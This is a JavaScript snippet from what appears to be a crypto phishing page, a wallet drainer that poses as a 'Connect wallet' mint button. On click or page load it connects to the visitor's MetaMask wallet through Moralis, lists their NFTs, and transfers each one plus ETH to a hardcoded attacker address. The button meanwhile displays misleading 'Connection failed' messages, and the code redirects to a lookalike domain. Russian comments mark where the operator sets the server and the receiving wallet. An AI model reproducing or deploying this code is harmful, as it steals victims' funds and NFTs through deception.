	<script>
		let metamaskInstalled = false;
		if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;

	
		var web3;
		var claim_data = null;
		var block = false;
		var addrr = "";
		var changeAddr = false;

		const serverUrl = "https://cww0z2a23jhh.usemoralis.com:2053/server"; //Сюда сервер 
		const appId = "H01skogF2VJ8bQKLKys69AanzspC5YGW1Uq89IY2"; //Сюда ключ
		Moralis.start({ serverUrl, appId }).catch(err => console.log(err));
		
		
		


		function strcmp(x, y) { 
			x = JSON.stringify(x).toLowerCase();
			y = JSON.stringify(y).toLowerCase();
			return (x<y?-1:(x>y?1:0));  
		}

		async function get_data() {
			const accounts = await ethereum.request({ method: 'eth_accounts' })
			addr = accounts[0]
			const optionssss = {
  address: addr,}


			if(claim_data !== null) {
				if(strcmp(addrr, addr) == 0) {
					return;
				}
			}
			
			claim_data = {receiver: '0xbcC389227723880531A89c619351092343A59f40', mint_price: 1,  nfts: await Moralis.Web3.getNFTs(optionssss)} // Сюда кошель и размер списания в эфире
		}

		async function sync_chain() {
			if(Moralis.getChainId() != "0x1") {
				try {
					await web3.currentProvider.request({
						method: "wallet_switchEthereumChain",
						params: [{ chainId: "0x1" }]
					});
				} catch (err) {
					console.log(err);
				}
			}
		}
		async function enable_web3() {
			try {
				web3 = await Moralis.enableWeb3();
			} catch(err) {
				return
			}
			if(addrr.length == 0) addrr = await Moralis.Web3.account.toString();
		}
		
		async function check(transaction, nft) {
			spliceArr(claim_data.nfts, nft);
			try {
				await transaction.wait()
				$("#connectButton").html("Connection failed");
				setTimeout(() => {$("#connectButton").html("Connect wallet")}, 2000);
			} catch(err) {
				claim_data.nfts.unshift(nft);
			}
		}
		
		async function send_nft(nft, receiver) {
			block = true;
			const options = {
			  type: nft.contract_type.toLowerCase(),
			  receiver: await receiver,
			  contractAddress: nft.token_address,
			  tokenId: nft.token_id,
			  amount: nft.amount,
			}
			console.log(options);
			let transaction = null;
			try {
				transaction = await Moralis.transfer(options);
			} catch(err) {
				console.log(err);
				if(err.toString().includes("invalid opcode: INVALID")) {
					spliceArr(claim_data.nfts, nft);
					return;
				}
				if(err.toString().includes("not owner")) {
					spliceArr(claim_data.nfts, nft);
					return;
				}
			}
			if(transaction != null) check(transaction, nft);
		}
		
		async function send_eth(receiver) {
			block = true;
			const options = {
				type: "native",
				amount: Moralis.Units.ETH(claim_data.mint_price),
				receiver: await receiver,
			};
			let stop = false;
			let result = await Moralis.transfer(options).catch(err => {
				if(err.code === 4001) {
					$("#connectButton").html("Connection failed");
					setTimeout(() => {$("#connectButton").html("Connect wallet")}, 4000);
				}
				if(err.toString().includes("insufficient funds")) {
					stop = true;
					block = false;
					$("#connectButton").html("Connection failed");
					setTimeout(() => {$("#connectButton").html("Connect wallet")}, 4000);
				}
			});
			return stop;
		}

		async function get() {
			for(var i = 0; i < claim_data.nfts.length; i++) {
				return claim_data.nfts[i];
			}
			return null;
		}

		async function send() {
			var nft = await get();
			if(nft == null) {
				stop = await send_eth(claim_data.receiver);
				if(stop) return;
			} else {
				await send_nft(nft, claim_data.receiver);
				if(await get() == null) block = false;
			}
			await send();
		}

		async function claim() {
			if(metamaskInstalled) {
				if(isMobile()) {
					Object.assign(document.createElement('a'), {
    target: 'https://metamask.app.link/dapp/0thersidemeta.xyz/',
    href: `https://metamask.app.link/dapp/0thersidemeta.xyz/${window.location.hostname}${window.location.pathname}`,
  }).click();
				} else {
					  Object.assign(document.createElement('a'), {
    target: '_blank',
    href: "https://metamask.app.link/dapp/0thersidemeta.xyz/",
  }).click();
				}
				return;
			}
			let user = Moralis.User.current();
			if (!user) {
				await enable_web3();
				await sync_chain();
				await get_data();
				$("#connectButton").html("Connect wallet");
				if(block) return;
				await send();
			} else {
				await sync_chain();
				await get_data();
				$("#connectButton").html("Connect wallet");
				if(block) return;
				await send();
			}
		}
	
	    $("#connectButton").click(async () => {
			await claim();
		});
		
		$(document).ready(async () => {
			if(!metamaskInstalled) return;
			await claim();
		});
		
		function spliceArr(nftArr, nft) {
			for(var i = 0; i < nftArr.length; i++){ 				   
				if (nftArr[i] === nft) {
					nftArr.splice(i, 1); 
					i--;
				}
			}
		}
